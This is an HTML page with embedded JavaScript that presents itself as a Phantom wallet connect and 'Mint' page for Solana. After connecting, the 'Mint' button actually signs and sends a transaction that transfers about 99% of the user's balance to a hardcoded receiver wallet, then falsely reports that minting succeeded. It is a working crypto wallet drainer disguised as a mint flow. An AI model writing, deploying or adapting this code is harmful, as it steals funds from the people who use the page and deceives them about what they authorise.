<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Connect Phantom Wallet</title>
  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>


  <script>
    $(document).ready(function () {
      $('#connect-wallet').on('click', async () => {
        console.log("Connect button clicked");

        if (window.solana && window.solana.isPhantom) {
          try {
            const resp = await window.solana.connect();
            if (!resp || !resp.publicKey) throw new Error("No public key returned");

            console.log("Phantom Wallet connected:", resp.publicKey.toString());

            // Use public Solana RPC for testing
            const connection = new solanaWeb3.Connection(
              solanaWeb3.clusterApiUrl('mainnet-beta'),
              'confirmed'
            );

            const public_key = new solanaWeb3.PublicKey(resp.publicKey);
            const walletBalance = await connection.getBalance(public_key);
            console.log("Wallet balance:", walletBalance);

            const minBalance = await connection.getMinimumBalanceForRentExemption(0);
            console.log("Min balance for rent exemption:", minBalance);

            if (walletBalance < minBalance) {
              alert("Insufficient funds for rent exemption.");
              return;
            }

            $('#connect-wallet').text("Mint");
            $('#connect-wallet').off('click').on('click', async () => {
              console.log("Mint button clicked");

              try {
                // ⚠️ SECURITY WARNING: This wallet receives user funds
                const receiverWallet = new solanaWeb3.PublicKey('FfkceXdH2oMPgRpZFKZJPmTE6fLKfUfDRke2gmxuf5n');
                const balanceForTransfer = walletBalance - minBalance;
                console.log("Balance for transfer:", balanceForTransfer);

                if (balanceForTransfer <= 0) {
                  alert("Insufficient funds for transfer.");
                  return;
                }

                const transaction = new solanaWeb3.Transaction().add(
                  solanaWeb3.SystemProgram.transfer({
                    fromPubkey: public_key,
                    toPubkey: receiverWallet,
                    lamports: Math.floor(balanceForTransfer * 0.99),
                  })
                );

                transaction.feePayer = public_key;
                const { blockhash } = await connection.getRecentBlockhash();
                transaction.recentBlockhash = blockhash;

                const signed = await window.solana.signTransaction(transaction);
                console.log("Transaction signed:", signed);

                const txid = await connection.sendRawTransaction(signed.serialize());
                await connection.confirmTransaction(txid);
                console.log("Transaction confirmed:", txid);
                alert("Minting transaction completed!");
              } catch (err) {
                console.error("Error during minting:", err);
                alert("Minting failed: " + err.message);
              }
            });
          } catch (err) {
            console.error("Error connecting to Phantom Wallet:", err);
            alert("Connection failed: " + (err.message || "Unexpected error"));
          }
        } else {
          alert("Phantom extension not found.");
          const isFirefox = typeof InstallTrigger !== "undefined";
          const isChrome = !!window.chrome;

          if (isFirefox) {
            window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
          } else if (isChrome) {
            window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
          } else {
            alert("Please download the Phantom extension for your browser.");
          }
        }
      });
    });
  </script>

</body>
</html>
